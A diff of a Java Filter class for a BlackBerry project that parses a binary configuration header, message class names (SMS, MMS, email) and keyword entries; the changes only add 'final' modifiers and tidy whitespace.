@@ -4,17 +4,15 @@ import java.io.EOFException;
 import java.util.Vector;
 
 import net.rim.device.api.util.DataBuffer;
-
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.WChar;
 
-
 class Filter {
     //#debug
     static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);
-    
+
     public static final int TYPE_REALTIME = 0;
     public static final int TYPE_COLLECT = 1;
 
@@ -22,7 +20,7 @@ class Filter {
     public static final int CLASS_SMS = 1;
     public static final int CLASS_MMS = 2;
     public static final int CLASS_EMAIL = 3;
-    
+
     public long size;
 
     public long version;
@@ -46,26 +44,25 @@ class Filter {
     public int payloadStart;
 
     public Filter(final byte[] conf, final int offset, final int length) {
-        int headerSize = 116;
-        int classNameLen = 32;
-        int confSize = conf.length - offset;
+        final int headerSize = 116;
+        final int classNameLen = 32;
+        final int confSize = conf.length - offset;
 
         Check.requires(confSize >= headerSize, "conf smaller than needed");
 
-        Prefix headerPrefix = new Prefix(conf, offset);
+        final Prefix headerPrefix = new Prefix(conf, offset);
 
         if (!headerPrefix.isValid()) {
             return;
         }
 
-        DataBuffer databuffer = new DataBuffer(conf,
+        final DataBuffer databuffer = new DataBuffer(conf,
                 headerPrefix.payloadStart, headerPrefix.length, false);
 
         //#ifdef DBC
         Check.asserts(headerPrefix.type == Prefix.TYPE_HEADER,
                 "Wrong prefix type");
-        Check.asserts(headerSize == headerPrefix.length,
-                "Wrong prefix length");
+        Check.asserts(headerSize == headerPrefix.length, "Wrong prefix length");
         //#endif
 
         // LETTURA del HEADER
@@ -77,7 +74,7 @@ class Filter {
             classname = new byte[classNameLen];
             databuffer.read(classname);
 
-            String classString = WChar.getString(classname, true);
+            final String classString = WChar.getString(classname, true);
             if (classString.equals("IPM.SMSText*")) {
                 classtype = Filter.CLASS_SMS;
             } else if (classString.equals("IPM.Note*")) {
@@ -105,7 +102,7 @@ class Filter {
             payloadStart = (int) (headerPrefix.payloadStart + size);
 
             valid = true;
-        } catch (EOFException e) {
+        } catch (final EOFException e) {
             valid = false;
 
         }
@@ -113,18 +110,18 @@ class Filter {
         // Lettura delle KEYWORDS
         if (length > headerPrefix.length) {
             // ogni keyword ha il suo prefix
-            int endOffset = offset + length;
+            final int endOffset = offset + length;
             int keywordOffset = offset + headerSize + Prefix.LEN;
 
             while (keywordOffset < endOffset) {
-                Prefix keywordPrefix = new Prefix(conf, keywordOffset);
+                final Prefix keywordPrefix = new Prefix(conf, keywordOffset);
 
                 //#ifdef DBC
                 Check.asserts(keywordPrefix.type == Prefix.TYPE_KEYWORD,
                         "Wrong prefix type");
                 //#endif
 
-                String keyword = WChar.getString(conf, keywordOffset,
+                final String keyword = WChar.getString(conf, keywordOffset,
                         keywordPrefix.length, false);
                 keywordOffset += keywordPrefix.length + Prefix.LEN;
 
